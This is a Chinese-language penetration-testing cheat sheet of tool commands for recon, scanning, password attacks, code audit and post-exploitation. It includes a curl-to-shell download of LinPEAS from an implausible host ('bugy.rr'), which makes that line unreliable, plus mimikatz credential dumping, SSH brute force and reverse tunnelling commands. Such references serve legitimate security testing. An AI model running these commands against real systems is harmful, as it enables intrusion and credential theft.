# 常用工具速查

## 目录
- [信息收集工具](#信息收集工具)
- [漏洞扫描工具](#漏洞扫描工具)
- [CVE扫描工具](#cve扫描工具)
- [漏洞利用框架](#漏洞利用框架)
- [密码攻击工具](#密码攻击工具)
- [代码审计工具](#代码审计工具)
- [后渗透工具](#后渗透工具)

---

## 信息收集工具

### 端口扫描

| 工具 | 命令 | 说明 |
|------|------|------|
| nmap | `nmap -p- -sV -O target` | 全端口扫描+服务+系统 |
| masscan | `masscan -p1-65535 --rate=10000 target` | 高速端口扫描 |
| rustscan | `rustscan -a target -- -sV` | 现代端口扫描器 |

### 子域名发现

| 工具 | 命令 |
|------|------|
| subfinder | `subfinder -d target.com -o subs.txt` |
| amass | `amass enum -passive -d target.com` |
| assetfinder | `assetfinder target.com` |
| ffuf | `ffuf -w wordlist -u https://FUZZ.target.com` |

### Web信息收集

| 工具 | 命令 |
|------|------|
| whatweb | `whatweb -v target.com` |
| wappalyzer | `wappalyzer target.com` |
| dirb | `dirb http://target.com wordlist.txt` |
| gobuster | `gobuster dir -u https://target.com -w wordlist.txt` |
| ffuf | `ffuf -u https://target.com/FUZZ -w wordlist.txt` |

### DNS枚举

| 工具 | 命令 |
|------|------|
| dig | `dig axfr target.com @ns.server` |
| dnsenum | `dnsenum target.com` |
| fierce | `fierce --domain target.com` |

### 综合OSINT

| 工具 | 命令 |
|------|------|
| theHarvester | `theHarvester -d target.com -b all` |
| recon-ng | `recon-ng` |
| maltego | 图形化OSINT工具 |

---

## 漏洞扫描工具

### Web漏洞扫描

| 工具 | 命令 |
|------|------|
| nikto | `nikto -h https://target.com` |
| sqlmap | `sqlmap -u "url" --batch` |
| XSStrike | `xsstrike -u "url"` |
| Burp Suite | 代理+扫描+Repeater |
| OWASP ZAP | `zap-baseline.py -t https://target.com` |

### 通用漏洞扫描

| 工具 | 命令 |
|------|------|
| nmap scripts | `nmap --script vuln target` |
| OpenVAS | `omp -C -x target` |
| Nessus | 图形化漏洞扫描 |

### 特定服务扫描

| 工具 | 命令 |
|------|------|
| smtp-user-enum | `smtp-user-enum -M VRFY -U users.txt -t target` |
| enum4linux | `enum4linux target` |
| ldapsearch | `ldapsearch -x -h target -b "dc=domain,dc=com"` |
| snmpwalk | `snmpwalk -v1 -c public target` |

---

## CVE扫描工具

### Nmap CVE脚本

```bash
# CVE检测脚本
nmap --script=cve*.nse target.com
nmap --script=vuln target.com
# 特定CVE
nmap --script=cve-2021-44228 target.com  # Log4Shell
nmap --script=cve-2022-22965 target.com  # Spring4Shell
```

### SearchSploit

```bash
searchsploit <keyword>                    # 搜索
searchsploit -w apache 2.4.49            # 显示在线链接
searchsploit -p 5000                     # 查看路径
searchsploit -m 5000                     # 复制到当前目录
```

### POC收集

| 资源 | 用途 |
|------|------|
| Exploit-DB | https://www.exploit-db.com |
| PacketStorm | https://packetstormsecurity.com |
| CVE Details | https://www.cvedetails.com |
| NVD | https://nvd.nist.gov |
| PoC-in-GitHub | https://github.com/nomi-sec/PoC-in-GitHub |

### 自动化CVE扫描

| 工具 | 命令 |
|------|------|
| vulscan | `nmap --script=vulscan target.com` |
| sn0int | `sn0int -r target.com` |
| cve-search | `cve-search -q "apache"` |
| Nuclei | `nuclei -u https://target.com -t cves/` |

---

## 漏洞利用框架

### Metasploit Framework

```bash
# 启动
msfconsole

# 常用命令
search <keyword>           # 搜索模块
use <module_path>          # 选择模块
show options               # 显示选项
set <option> <value>       # 设置参数
run / exploit              # 执行
sessions -l                # 列出会话
sessions -i <id>            # 进入会话
post <module>               # 后渗透模块
```

### SearchSploit

```bash
searchsploit <keyword>           # 搜索
searchsploit -t <title>           # 标题搜索
searchsploit -p <id>              # 查看路径
searchsploit -m <id>              # 复制到当前目录
```

### 其他Exploit工具

| 工具 | 用途 |
|------|------|
| pwntools | Python漏洞利用开发 |
| ROPgadget | ROP链构建 |
| one_gadget | One_gadget查找 |

---

## 密码攻击工具

### 在线密码攻击

| 工具 | 命令 |
|------|------|
| hydra | `hydra -l root -P pass.txt ssh://target` |
| medusa | `medusa -h target -u admin -P pass.txt -M ssh` |
| crowbar | `crowbar -b sshkey -s target -u user -k key.pem` |

### 离线密码破解

| 工具 | 命令 |
|------|------|
| hashcat | `hashcat -m 1000 -a 0 hash.txt wordlist.txt` |
| john | `john --wordlist=pass.txt hash.txt` |
| hashid | `hashid hash` |
| mimikatz | Windows凭据提取 |

### 密码抓取

| 工具 | 命令 |
|------|------|
| mimikatz | `privilege::debug; sekurlsa::logonpasswords` |
| lazysysadmin | Linux凭据抓取 |
| mimipenguin | Linux密码抓取 |

---

## 代码审计工具

### 静态代码分析

| 工具 | 适用语言 | 命令 |
|------|---------|------|
| Semgrep | 多语言 | `semgrep --config=p/security audits /path` |
| Bandit | Python | `bandit -r ./python_project/` |
| SonarQube | 多语言 | Web界面分析 |
| RIPS | PHP | `docker run rips/rips` |
| CodeQL | 多语言 | `codeql database create --language=python` |

### 专用审计工具

| 工具 | 用途 | 命令 |
|------|------|------|
| phpanlyzer | PHP | PHP安全分析 |
| nodejsscan | Node.js | `nodejsscan -d /path` |
| brakeman | Ruby/Rails | `brakeman -o report.html` |
| Gosec | Go | `gosec ./...` |
| FindBugs | Java | Maven插件 |

### 反序列化工具

| 工具 | 用途 |
|------|------|
| ysoserial | Java反序列化 |
| PHPGGC | PHP反序列化 |
| Python反序列化 | pickle/YAML |

### 敏感信息检测

```bash
# 密钥检测
grep -rn "password\|secret\|api_key\|token" --include="*.py"
# 硬编码检测
find . -name "*.properties" -exec grep -l "password" {} \;
# Git历史泄露
git-dumper http://target.com/.git /tmp/target
```

---

## 后渗透工具

### 本地枚举

| 工具 | 命令 |
|------|------|
| LinPEAS | `curl -L https://bugy.rr/linpeas.sh \| sh` |
| LinEnum | `bash linenum.sh` |
| linux-smart-enumeration | `lse.sh -l 1` |
| pspy | `pspy64` |

| 工具 | 命令 |
|------|------|
| WinPEAS | `winpeas.exe` |
| Seatbelt | `Seatbelt.exe -group=all` |
| PowerSploit | PowerShell后渗透框架 |
| SharpUp | `SharpUp.exe audit` |

### 横向移动

| 工具 | 命令 |
|------|------|
| CrackMapExec | `cme smb target -u user -p pass` |
| Evil-WinRM | `evil-winrm -i target -u user -p pass` |
| psexec | `psexec.py user@target` |
| wmiexec | `wmiexec.py user@target` |

### 持久化

| 平台 | 方法 |
|------|------|
| Linux | crontab, systemd, SSH key, .bashrc |
| Windows | 注册表Run键, 计划任务, 服务 |

### 权限提升

| 工具 | 命令 |
|------|------|
| Sudo提权 | GTFOBins.org |
| 内核漏洞 | `searchsploit "Linux Kernel"` |
| SUID提权 | `find / -perm -4000 2>/dev/null` |

### 隧道与转发

| 工具 | 命令 |
|------|------|
| sshuttle | `sshuttle -r user@target 0/0` |
| chisel | `./chisel server --reverse` |
| plink | `plink -L localport:target:remoteport user@target` |
| socat | `socat TCP-LISTEN:port,fork TCP:target:port` |
